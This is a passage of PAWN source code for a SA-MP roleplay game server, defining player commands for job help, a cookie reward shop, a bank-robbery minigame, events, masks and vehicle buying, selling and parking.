       SendClientMessage(playerid, COLOR_GOV, "* GOV Commands: {FFFFFF}/r /d /settax /taxvault /taxwithdraw /showbadge /locker /gov");
       SendClientMessage(playerid, COLOR_GOV, "* GOV Commands: {FFFFFF}/invite /uninvite /rank /resfacveh");
	   return 1;
	}
	if(IsAHitman(playerid))
	{
       SendClientMessage(playerid, COLOR_WHITE, "* HA Commands: {FFFFFF}/hit /hitmansms /order /contracts /profile /givehit");
       SendClientMessage(playerid, COLOR_WHITE, "* HA Commands: {FFFFFF}/invite /uninvite /rank");
	   return 1;
	}
	if(IsMedic(playerid))
	{
       SendClientMessage(playerid, COLOR_MEDIC, "* LSFMD Commands: {FFFFFF}/r /d showbadge /movept /healpt /revivept /locker");
       SendClientMessage(playerid, COLOR_MEDIC, "* LSFMD Commands: {FFFFFF}/gov /rank /members /invite /uninvite /resfacveh");
	   return 1;
	}
	return 1;
}

IRP:jobhelp(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	SendClientMessage(playerid, COLOR_YELLOW, "* Trucker Job: {FFFFFF}/load /delivery");
	SendClientMessage(playerid, COLOR_YELLOW, "* Bodyguard Job: {FFFFFF}/vest");
	SendClientMessage(playerid, COLOR_YELLOW, "* Mechanic Job: {FFFFFF}/mech");
	SendClientMessage(playerid, COLOR_YELLOW, "* Lawyer Job: {FFFFFF}/free /defend");
	SendClientMessage(playerid, COLOR_YELLOW, "* Mechanic Job: {FFFFFF}/mech");
	SendClientMessage(playerid, COLOR_YELLOW, "* Weapons Dealer Job: {FFFFFF}/sellgun /creategun");
	SendClientMessage(playerid, COLOR_YELLOW, "* Weapons Smuggler Job: {FFFFFF}/getmats /delivermats /sellmats");
	SendClientMessage(playerid, COLOR_YELLOW, "* Drugs Dealer Job: {FFFFFF}/buyseed /buycocaine /sellweed /sellcocaine /plant /checkweed /pickweed");
	SendClientMessage(playerid, COLOR_YELLOW, "* Drugs Smuggler Job: {FFFFFF}/getcrate /deliverweed /delivercocaine");
	return 1;
}
IRP:cookieshelp(playerid, var[])
{
	new string[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
    SendClientMessage(playerid, COLOR_LIGHTRED, "_____________________________________________________");
    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /usecookies [option]");
	SendClientMessage(playerid, COLOR_GRAD2, " Full Health (1 Cookie) | Full Armor (2 Cookies) | 50 Bullets (6 Cookies)");
	SendClientMessage(playerid, COLOR_GRAD2, " 10 Weed (6 Cookies) | 10 Cocaine (8 Cookies) | House Ticket (25 Cookies) | Biz Ticket (50 Cookies)");
	format(string, sizeof(string), "* You have %d cookies.", Player[playerid][pCookie]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	SendClientMessage(playerid, COLOR_LIGHTRED, "_____________________________________________________");
	return 1;
}
IRP:usecookies(playerid, var[])
{
	new string[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
    if(sscanf(var, "s[32]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /usecookies [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: Health | Armor | Bullets | Weed | Cocaine | House Ticket | Business Ticket");
		return 1;
	}
	if(!strcmp(var, "health", true))
	{
	    if(Player[playerid][pCookie] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    SetPlayerHealth(playerid, 100);
		Player[playerid][pCookie] -= 1;
		format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 1 cookie for full health.");
	}
	else if(!strcmp(var, "armor", true))
	{
	    if(Player[playerid][pCookie] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    SetPlayerArmour(playerid, 100);
	    Player[playerid][pCookie] -= 2;
	    format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 2 cookies for full armor.");
	}
	else if(!strcmp(var, "bullets", true))
	{
	    if(Player[playerid][pCookie] < 6) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    if(!IsHoldingBullets(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding a weapon with bullets.");
	    GiveZamoraWeapon(playerid, GetPlayerWeapon(playerid), 50);
	    Player[playerid][pCookie] -= 6;
	    format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 6 cookies for 50 bullets for the weapon you are holding.");
	}
	else if(!strcmp(var, "weed", true))
	{
	    if(Player[playerid][pCookie] < 6) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    Player[playerid][pWeed] += 10;
	    Player[playerid][pCookie] -= 6;
	    format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 6 cookies for 10 grams of weed.");
	}
	else if(!strcmp(var, "seeds", true))
	{
	    if(Player[playerid][pCookie] < 6) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    Player[playerid][pSeeds] += 10;
	    Player[playerid][pCookie] -= 6;
	    format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 6 cookies for 10 seeds.");
	}
	else if(!strcmp(var, "cocaine", true))
	{
	    if(Player[playerid][pCookie] < 8) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    Player[playerid][pCocaine] += 50;
	    Player[playerid][pCookie] -= 8;
	    format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 8 cookies for 10 grams of cocaine.");
	}
	else if(!strcmp(var, "houseticket", true))
	{
	    if(Player[playerid][pCookie] < 25) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    Player[playerid][pCookie] -= 25;
	    format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 25 cookies for a House Ticket, take ss and make an administrative request.");
	}
	else if(!strcmp(var, "businessticket", true))
	{
	    if(Player[playerid][pCookie] < 50) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
	    Player[playerid][pCookie] -= 50;
	    format(string, sizeof(string), "* %s has used some cookies.", GetName(playerid));
 		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		format(string, sizeof(string), " You have used 50 cookies for a Business Ticket, take ss and make an administrative request.");
	}
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:setuprobbery(playerid, var[])
{
	new string[128], cops;
    if(!Logged(playerid)) return NoLogin(playerid);
    if(IsACop(playerid) || IsAGov(playerid) || IsFBI(playerid) || IsDOC(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't rob the bank.");
	if(BankRobbery) return SendClientMessage(playerid, COLOR_GRAD2, "A bank robbery is already being setup.");
	if(BankRobberyTime)
	{
		format(string, sizeof(string), "You need to wait %d more hours before robbing the bank again.", BankRobberyTime);
		SendClientMessage(playerid, COLOR_GRAD2, string);
	    return 1;
	}
	foreach(Player, i)
	{
	    if(Player[i][pFac] == 1 && Player[i][pFacDuty]) cops ++;
	}
	if(cops < 3) return SendClientMessage(playerid, COLOR_GRAD2, "There aren't enough cops on duty to start a robbery.");
	BankRobbery = 1;
	BankRobber[playerid] = 1;
	BankRobbersCount = 1;
	SendClientMessage(playerid, COLOR_YELLOW, "** You've started a bank robbery, Players can join you by typing /joinrobbery.");
	return 1;
}

IRP:joinrobbery(playerid, var[])
{
	new string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
    if(IsACop(playerid) || IsAGov(playerid) || IsFBI(playerid) || IsDOC(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't rob the bank.");
	if(!BankRobbery) return SendClientMessage(playerid, COLOR_GRAD2, "There is no one robbing the bank.");
	if(BankRobber[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already participating in the bank robbery.");
	if(RobberyRequest[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You have already sent a request to join the robbery.");
	if(RobberyStarted) return SendClientMessage(playerid, COLOR_GRAD2, "The bank robbery has already started.");
	SendClientMessage(playerid, COLOR_YELLOW, "** You've sent a request to the robbery leader to join him.");
	format(string, sizeof(string), "%s has requested to join the bank robbery. (/acceptrobbery)", GetName(playerid));
	SendRobberyMessage(COLOR_YELLOW, string);
	RobberyRequest[playerid] = 1;
	return 1;
}


IRP:acceptrobbery(playerid, var[])
{
	new string[128], user;
    if(!Logged(playerid)) return NoLogin(playerid);
	if(!BankRobbery) return SendClientMessage(playerid, COLOR_GRAD2, "There's no bank robbery setup.");
	if(BankRobber[playerid] != 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not the bank robbery leader.");
	if(BankRobbersCount >= 5) return SendClientMessage(playerid, COLOR_GRAD2, "You can't have more than 5 players robbing the bank.");
	if(RobberyStarted) return SendClientMessage(playerid, COLOR_GRAD2, "The bank robbery has already started.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /acceptrobbery [playerid]");
	if(!RobberyRequest[user]) return SendClientMessage(playerid, COLOR_GRAD2, "Player hasn't requested to join the robbery.");
	RobberyRequest[user] = 0;
	BankRobbersCount ++;
	BankRobber[user] = BankRobbersCount;
	format(string, sizeof(string), "%s has accepted %s's request to join the bank robbery.", GetName(playerid), GetName(user));
	SendRobberyMessage(COLOR_YELLOW, string);
	return 1;
}

IRP:startrobbery(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
	if(!BankRobbery) return SendClientMessage(playerid, COLOR_GRAD2, "There's no bank robbery being setup.");
	if(BankRobber[playerid] != 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not the bank robbery leader.");
	if(RobberyStarted) return SendClientMessage(playerid, COLOR_GRAD2, "The bank robbery has already started.");
	if(BankRobbersCount < 2) return SendClientMessage(playerid, COLOR_GRAD2, "There aren't enough robbers to rob the bank.");
	if(!IsPlayerInRangeOfPoint(playerid, 3, 2237.7341,2095.7544,100.3772)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the bank vault.");
	RobberyStarted = 1;
	SetTimer("BankVaultTimer", 10000, false);
	SendRobberyMessage(COLOR_YELLOW, "** The bank vault is going to explode in 10 seconds, move away from it **");
	SendCopMessage(COLOR_BLUE, "LS Bank: There is a group of people attempting to rob the bank.");
	SendFBIMessage(COLOR_FBI, "LS Bank: There is a group of people attempting to rob the bank.");
	BankRobberyTime = 4;
	ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
	ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
	return 1;
}
IRP:mask(playerid, var[])
{
	new string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][pMask]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a mask.");
    if(Player[playerid][pMasked] == 0)
    {
		Player[playerid][pMasked] = 1;
        format(string, sizeof(string), "* %s has put his mask on his face.", GetName(playerid));
     	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
     	for(new i = 0; i < MAX_PLAYERS; i++)
		{
			ShowPlayerNameTagForPlayer(i, playerid, false);
		}
    }
    else
    {
        Player[playerid][pMasked] = 0;
        format(string, sizeof(string), "* Stranger has removed the mask from his face.");
     	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
     	for(new i = 0; i < MAX_PLAYERS; i++)
		{
			ShowPlayerNameTagForPlayer(i, playerid, true);
		}
    }
    return 1;
}

IRP:joinevent(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pEBanned]) return SendClientMessage(playerid, COLOR_GRAD2, "You are banned from joining events.");
   	if(IsPlayerTazed(playerid) && IsPlayerCuffed(playerid) && IsPlayerTied(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to join events at the moment");
   	if(Player[playerid][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to join the event while you are injured.");
    if(Event[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already in the event.");
	if(!EventOn) return SendClientMessage(playerid, COLOR_GRAD2, "There's no current event happening.");
	if(EventLocked) return SendClientMessage(playerid, COLOR_GRAD2, "The event is locked, be faster next time.");
	if(EventType == 1)
	{
	    Player[playerid][pInt] = GetPlayerInterior(playerid);
    	Player[playerid][pVW] = GetPlayerVirtualWorld(playerid);
    	GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
    	GetPlayerHealth(playerid, Player[playerid][pHealth]);
    	GetPlayerArmour(playerid, Player[playerid][pArmor]);
    	SetPlayerPos(playerid, ePos[0], ePos[1], ePos[2]);
    	SetPlayerInterior(playerid, eInt);
    	SetPlayerVirtualWorld(playerid, eVW);
    	for(new i=0; i<13; i++)
    	{
	    	GetPlayerWeaponData(playerid, i, Player[playerid][pWeapon][i], Player[playerid][pWeaponAmmo][i]);
    	}
    	GunsBeingRemoved[playerid] = 1;
    	ResetPlayerWeapons(playerid);
    	Event[playerid] = 1;
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** Please wait until the event starts and you will recieve everything set by the organizer.");
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** Your original health, armor and weapons will be refunded once you leave the event, /quitevent to leave at any time.");
    }
    else if(EventType == 2)
	{
		Player[playerid][pColor] = GetPlayerColor(playerid);
		Player[playerid][pModel] = GetPlayerSkin(playerid);
	    Player[playerid][pInt] = GetPlayerInterior(playerid);
    	Player[playerid][pVW] = GetPlayerVirtualWorld(playerid);
    	GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
    	GetPlayerHealth(playerid, Player[playerid][pHealth]);
    	GetPlayerArmour(playerid, Player[playerid][pArmor]);
    	SetPlayerPos(playerid, ePos[0], ePos[1], ePos[2]);
    	SetPlayerInterior(playerid, eInt);
    	SetPlayerVirtualWorld(playerid, eVW);
    	for(new i=0; i<13; i++)
    	{
	    	GetPlayerWeaponData(playerid, i, Player[playerid][pWeapon][i], Player[playerid][pWeaponAmmo][i]);
    	}
    	GunsBeingRemoved[playerid] = 1;
    	ResetPlayerWeapons(playerid);
    	Event[playerid] = 1;
    	new rr = random(2);
        if(rr == 1)
        {
            SetPlayerSkin(playerid, 230);
            EventTeam[playerid] = 1;
        }
        else if(rr == 2)
        {
            SetPlayerSkin(playerid, 137);
            EventTeam[playerid] = 2;
        }
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** Please wait until the event starts and you will recieve everything set by the organizer.");
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** Your original health, armor and weapons will be refunded once you leave the event, /quitevent to leave at any time.");
    	SendClientMessage(playerid, COLOR_LIGHTRED, "** Please stay at your team base till the event starts.");
    }
	return 1;
}

IRP:quitevent(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!EventOn) return SendClientMessage(playerid, COLOR_GRAD2, "There's no current event happening.");
	if(!Event[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside the event.");
	Event[playerid] = 0;
    SetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
	SetPlayerSkin(playerid, Player[playerid][pModel]);
	SetPlayerColor(playerid, Player[playerid][pColor]);
	SetPlayerInterior(playerid, Player[playerid][pInt]);
	SetPlayerVirtualWorld(playerid, Player[playerid][pVW]);
	SetPlayerHealth(playerid, Player[playerid][pHealth]);
	SetPlayerArmour(playerid, Player[playerid][pArmor]);
	SendClientMessage(playerid, COLOR_LIGHTRED, "** You have decided to quit the event.");
	GunsBeingRemoved[playerid] = 1;
	ResetPlayerWeapons(playerid);
	GunsBeingRemoved[playerid] = 1;
	for(new w = 0; w < 13; w++)
	{
	    GiveZamoraWeapon(playerid, Player[playerid][pWeapon][w], Player[playerid][pWeaponAmmo][w]);
	}
	return 1;
}
IRP:locate(playerid, var[])
{
	new Float:vx, Float:vy, Float:vz;
    if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][vModel]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to complete this action, as You don't own any vehicle.");
    if(Player[playerid][pVVeh])
    {
        new carid;
		if(sscanf(var, "i", carid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /locatecar [1/2/3/4]");
		if(carid == 1)
		{
            if(Player[playerid][vModel])
            {
       			GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
	    		SetPlayerCheckpoint(playerid, vx, vy, vz, 2);
		    	SendClientMessage(playerid, COLOR_LIGHTBLUE, " A marker on your GPS showing where your vehicle is has been placed. (Vehicle 1)");
		    }
		}
		else if(carid == 2)
		{
            if(Player[playerid][vVModel])
            {
     			GetVehiclePos(Player[playerid][pVVeh], vx, vy, vz);
	    		SetPlayerCheckpoint(playerid, vx, vy, vz, 2);
    			SendClientMessage(playerid, COLOR_LIGHTBLUE, " A marker on your GPS showing where your vehicle is has been placed. (Vehicle 2)");
      }
		}
		else if(carid == 3)
		{
            if(Player[playerid][vVVModel])
            {
	    		GetVehiclePos(Player[playerid][pVVVeh], vx, vy, vz);
	    		SetPlayerCheckpoint(playerid, vx, vy, vz, 2);
	    		SendClientMessage(playerid, COLOR_LIGHTBLUE, " A marker on your GPS showing where your vehicle is has been placed. (Vehicle 3)");
	    	}
		}
		else if(carid == 4)
		{
            if(Player[playerid][vVVVModel])
            {
	    		GetVehiclePos(Player[playerid][pVVVVeh], vx, vy, vz);
		    	SetPlayerCheckpoint(playerid, vx, vy, vz, 2);
    			SendClientMessage(playerid, COLOR_LIGHTBLUE, " A marker on your GPS showing where your vehicle is has been placed. (Vehicle 4)");
    		}
		}
    }
    else
	{
		GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
		SetPlayerCheckpoint(playerid, vx, vy, vz, 2);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, " A marker on your GPS showing where your vehicle is has been placed.");
	}
	return 1;
}
IRP:buycar(playerid, var[])
{
	new string[128];
    if(!IsPlayerInRangeOfPoint(playerid, 2, 545.6661,-1292.2437,17.2422)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to complete this action, as you are not at the vehicle's dealership.");
    if(Player[playerid][vModel] && Player[playerid][vVModel] && Player[playerid][vVVModel])
	{
		if(Player[playerid][pVIP] < 4)
		{
			format(string, sizeof(string), "You are not able to complete this action, as you own two vehicles. (%d), (%d), and (%d)", Player[playerid][pVeh], Player[playerid][pVVeh], Player[playerid][pVVVeh]);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		    return 1;
		}
	    ShowDialog(playerid, 35);
	    return 1;
	}
	if(Player[playerid][vModel] && Player[playerid][vVModel])
	{
		if(Player[playerid][pVIP] < 3)
		{
			format(string, sizeof(string), "You are not able to complete this action, as you own two vehicles. (%d), and (%d)", Player[playerid][pVeh], Player[playerid][pVVeh]);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		    return 1;
		}
		ShowDialog(playerid, 35);
	    return 1;
	}
	if(Player[playerid][vModel])
	{
        if(Player[playerid][pLevel] < 5)
        {
    		format(string, sizeof(string), "You are not able to complete this action, as you own a vehicle. (%d)", Player[playerid][pVeh]);
       		SendClientMessage(playerid, COLOR_GRAD2, string);
    	    return 1;
        }
        ShowDialog(playerid, 35);
        return 1;
	}
	if(!Player[playerid][vModel])
	{
        ShowDialog(playerid, 35);
        return 1;
	}
	return 1;
}
IRP:sellcartomarket(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsPlayerInRangeOfPoint(playerid, 2, 545.6661,-1292.2437,17.2422)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the vehicles dealership.");
	if(!Player[playerid][pVeh] && !Player[playerid][pVVeh] && !Player[playerid][pVVVeh] && !Player[playerid][pVVVVeh]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a vehicle.");
	if(GetPlayerVehicleID(playerid) != Player[playerid][pVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVVeh]) return SendClientMessage(playerid, COLOR_GRAD2, "You must be in the vehicle you own to sell to the dealership.");
	if(sscanf(var, "s[8]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellcartomarket [confirm]");
	// Start of Payback
	new price;
	if(!strcmp(var, "confirm", true))
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 507) price = 24000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 426) price = 29000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 405) price = 25000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 550) price = 23000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 421) price = 19000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 496) price = 20000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 542) price = 18000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 439) price = 24000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 549) price = 21000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 536) price = 22000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 534) price = 20000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 567) price = 26000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 535) price = 28000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 576) price = 23000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 579) price = 32000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 400) price = 27000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 500) price = 25000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 505) price = 30000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 495) price = 43000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 554) price = 24000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 586) price = 15000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 521) price = 35000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 461) price = 29000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 463) price = 25000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 468) price = 17000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 481) price = 1000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 429) price = 55000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 402) price = 64000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 558) price = 32000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 589) price = 36000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 602) price = 27000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 415) price = 245000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 541) price = 425000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 411) price = 615000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 451) price = 520000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 587) price = 36000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 560) price = 120000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 559) price = 48000;
	else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 480) price = 57000;

	if(Player[playerid][pVIP] >= 2)
	{
    	GiveZamoraMoney(playerid, (75*price)/100);
    }
    else
    {
		GiveZamoraMoney(playerid, (30*price)/100);
	}
	// End of Payback
	if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
	{
		DestroyVehicle(Player[playerid][pVeh]);
		Player[playerid][pVeh] = 0;
	    Player[playerid][vModel] = 0;
		Player[playerid][vX] = 0;
		Player[playerid][vY] = 0;
		Player[playerid][vZ] = 0;
		Player[playerid][vA] = 0;
		Player[playerid][vC1] = 0;
		Player[playerid][vC2] = 0;
		SendClientMessage(playerid, COLOR_GREEN, " You have sold your vehicle to the dealership. (75 percent of the original price was paid back)");
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
	{
		DestroyVehicle(Player[playerid][pVVeh]);
		Player[playerid][pVVeh] = 0;
	    Player[playerid][vVModel] = 0;
		Player[playerid][vVX] = 0;
		Player[playerid][vVY] = 0;
		Player[playerid][vVZ] = 0;
		Player[playerid][vVA] = 0;
		Player[playerid][vVC1] = 0;
		Player[playerid][vVC2] = 0;
		SendClientMessage(playerid, COLOR_GREEN, " You have sold your vehicle to the dealership. (75 percent of the original price was paid back)");
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
	{
		DestroyVehicle(Player[playerid][pVVVeh]);
		Player[playerid][pVVVeh] = 0;
	    Player[playerid][vVVModel] = 0;
		Player[playerid][vVVX] = 0;
		Player[playerid][vVVY] = 0;
		Player[playerid][vVVZ] = 0;
		Player[playerid][vVVA] = 0;
		Player[playerid][vVVC1] = 0;
		Player[playerid][vVVC2] = 0;
		SendClientMessage(playerid, COLOR_GREEN, " You have sold your vehicle to the dealership. (75 percent of the original price was paid back)");
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
	{
  		DestroyVehicle(Player[playerid][pVVVVeh]);
		Player[playerid][pVVVVeh] = 0;
	    Player[playerid][vVVVModel] = 0;
		Player[playerid][vVVVX] = 0;
		Player[playerid][vVVVY] = 0;
		Player[playerid][vVVVZ] = 0;
		Player[playerid][vVVVA] = 0;
		Player[playerid][vVVVC1] = 0;
		Player[playerid][vVVVC2] = 0;
		SendClientMessage(playerid, COLOR_GREEN, " You have sold your vehicle to the dealership. (75 percent of the original price was paid back)");
	}
	return 1;
}
IRP:park(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not driving your own vehicle to park it.");
	if(GetPlayerVehicleID(playerid) != Player[playerid][pVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVVeh]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a vehicle you can park.");
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have parked your vehicle, it will always spawn here until you park it somewhere else.");
	if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVeh], i);
		}
		GetVehiclePos(Player[playerid][pVeh],Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ]);
		GetVehicleZAngle(Player[playerid][pVeh],Player[playerid][vA]);
		DestroyVehicle(Player[playerid][pVeh]);
		Player[playerid][pVeh] = CreateVehicle(Player[playerid][vModel], Player[playerid][vX], Player[playerid][vY], Player[playerid][vZ],Player[playerid][vA],Player[playerid][vC1],Player[playerid][vC2],1200);
	    ChangeVehiclePaintjob(Player[playerid][pVeh], Player[playerid][vPJ]);
		for(new i=0; i<14; i++)
		{
		    AddVehicleComponent(Player[playerid][pVeh], Player[playerid][pVehMod][i]);
		}
	}
	else if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVeh], i);
		}
		GetVehiclePos(Player[playerid][pVVeh],Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ]);
		GetVehicleZAngle(Player[playerid][pVVeh],Player[playerid][vVA]);
		DestroyVehicle(Player[playerid][pVVeh]);
		Player[playerid][pVVeh] = CreateVehicle(Player[playerid][vVModel], Player[playerid][vVX], Player[playerid][vVY], Player[playerid][vVZ],Player[playerid][vVA],Player[playerid][vVC1],Player[playerid][vVC2],1200);
	    ChangeVehiclePaintjob(Player[playerid][pVVeh], Player[playerid][vVPJ]);
		for(new i=0; i<14; i++)
		{
